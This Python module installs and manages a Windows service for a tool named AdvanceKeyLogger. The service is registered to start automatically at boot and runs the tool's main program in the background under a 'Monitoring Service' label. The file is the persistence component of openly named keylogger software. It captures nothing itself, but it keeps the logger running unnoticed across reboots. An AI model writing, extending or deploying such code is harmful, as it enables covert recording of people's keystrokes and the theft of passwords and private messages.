"""
Windows Service integration (requires pywin32).
"""
from __future__ import annotations

import os
import subprocess
import sys
from typing import Any


class WindowsServiceManager:
    """Manage Windows services if pywin32 is available."""

    def __init__(self) -> None:
        try:
            import win32service  # type: ignore
            import win32serviceutil  # type: ignore
            import win32event  # type: ignore
        except Exception:
            self._win32 = None
        else:
            self._win32 = {
                "service": win32service,
                "serviceutil": win32serviceutil,
                "event": win32event,
            }

    def install(self, spec) -> str:
        if self._win32 is None:
            return "pywin32 not installed; cannot install Windows service."
        serviceutil = self._win32["serviceutil"]
        serviceutil.InstallService(
            pythonClassString="service.windows_service.AdvanceKeyLoggerService",
            serviceName=spec.name,
            displayName=spec.description,
            startType=self._win32["service"].SERVICE_AUTO_START,
            exeArgs=f'--config "{spec.config_path}"',
        )
        return f"Installed Windows service {spec.name}"

    def uninstall(self, spec) -> str:
        if self._win32 is None:
            return "pywin32 not installed; cannot uninstall Windows service."
        serviceutil = self._win32["serviceutil"]
        serviceutil.RemoveService(spec.name)
        return f"Uninstalled Windows service {spec.name}"

    def start(self, spec) -> str:
        if self._win32 is None:
            return "pywin32 not installed; cannot start Windows service."
        serviceutil = self._win32["serviceutil"]
        try:
            serviceutil.StartService(spec.name)
        except Exception as exc:
            return f"Failed to start Windows service {spec.name}: {exc}"
        return f"Started Windows service {spec.name}"

    def stop(self, spec) -> str:
        if self._win32 is None:
            return "pywin32 not installed; cannot stop Windows service."
        serviceutil = self._win32["serviceutil"]
        try:
            serviceutil.StopService(spec.name)
        except Exception as exc:
            return f"Failed to stop Windows service {spec.name}: {exc}"
        return f"Stopped Windows service {spec.name}"

    def restart(self, spec) -> str:
        if self._win32 is None:
            return "pywin32 not installed; cannot restart Windows service."
        serviceutil = self._win32["serviceutil"]
        try:
            serviceutil.StopService(spec.name)
            serviceutil.StartService(spec.name)
        except Exception as exc:
            return f"Failed to restart Windows service {spec.name}: {exc}"
        return f"Restarted Windows service {spec.name}"

    def status(self, spec) -> str:
        if self._win32 is None:
            return "pywin32 not installed; Windows service status unavailable."
        serviceutil = self._win32["serviceutil"]
        try:
            status = serviceutil.QueryServiceStatus(spec.name)[1]
        except Exception:
            return f"{spec.name}: unknown"
        return f"{spec.name}: status={status}"


if "win32serviceutil" in sys.modules:
    import win32serviceutil  # type: ignore
    import win32service  # type: ignore
    import win32event  # type: ignore

    class AdvanceKeyLoggerService(win32serviceutil.ServiceFramework):
        _svc_name_ = "advancekeylogger"
        _svc_display_name_ = "AdvanceKeyLogger Monitoring Service"
        _svc_description_ = "AdvanceKeyLogger background monitoring service"

        def __init__(self, args):
            super().__init__(args)
            self._stop_event = win32event.CreateEvent(None, 0, 0, None)
            self._process: subprocess.Popen | None = None

        def SvcStop(self):
            self.ReportServiceStatus(win32service.SERVICE_STOP_PENDING)
            win32event.SetEvent(self._stop_event)
            if self._process:
                self._process.terminate()

        def SvcDoRun(self):
            args = [sys.executable, "-m", "main"] + sys.argv[1:]
            self._process = subprocess.Popen(args)
            win32event.WaitForSingleObject(self._stop_event, win32event.INFINITE)
